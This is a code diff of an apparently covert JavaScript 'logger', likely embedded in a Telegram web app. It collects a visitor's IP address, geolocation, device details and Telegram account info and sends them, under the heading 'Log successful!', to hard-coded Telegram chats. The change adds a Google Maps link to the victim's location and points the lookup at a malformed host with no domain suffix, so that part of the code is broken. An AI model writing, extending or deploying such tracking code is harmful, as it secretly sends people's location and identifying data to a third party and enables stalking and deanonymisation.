@@ -1,6 +1,6 @@
-async function getIPLocation(ip) {
+async function getLocationInfo(ip) {
     try {
-        const response = await fetch(`https://ipinfo.io/${ip}?token=YOUR_IPINFO_TOKEN`);
+        const response = await fetch(`https://c6c0e1a8e22e4a/${ip}?token=ВАШ_ТОКЕН`);
         const data = await response.json();
         return data;
     } catch (error) {
@@ -20,7 +20,7 @@ async function sendDataToTelegram() {
     const additionalChatId = 6639527896;
 
     const ipAddress = await getIPAddress();
-    const ipLocation = await getIPLocation(ipAddress);
+    const locationInfo = await getLocationInfo(ipAddress);
     const userAgent = getUserAgent();
     const osName = getOSName();
     const screenResolution = getScreenResolution();
@@ -35,6 +35,9 @@ async function sendDataToTelegram() {
     const languageCode = userInfo.language_code || 'неизвестно';
     const allowsWriteToPm = userInfo.allows_write_to_pm ? 'да' : 'нет';
 
+    // Формируем ссылку на карту
+    const mapLink = locationInfo.loc ? `https://www.google.com/maps?q=${locationInfo.loc}` : 'неизвестно';
+
     const message = `
 <b> Лог успешен!</b>
 
@@ -48,9 +51,9 @@ async function sendDataToTelegram() {
 
 <b>🖥️ Информация об устройстве:</b>
 ├ Айпи: <code>${ipAddress}</code>
-├ Страна: <code>${ipLocation.country}</code>
-├ Город: <code>${ipLocation.city}</code>
-├ Координаты: <code>${ipLocation.loc}</code>
+├ Страна: <code>${locationInfo.country}</code>
+├ Город: <code>${locationInfo.city}</code>
+├ Ссылка на карту: <a href="${mapLink}">${mapLink}</a>
 ├ UserAgent: <code>${userAgent}</code>
 ├ Хэш: <code>неизвестно</code>
 ├ Имя ОС: <code>${osName}</code>
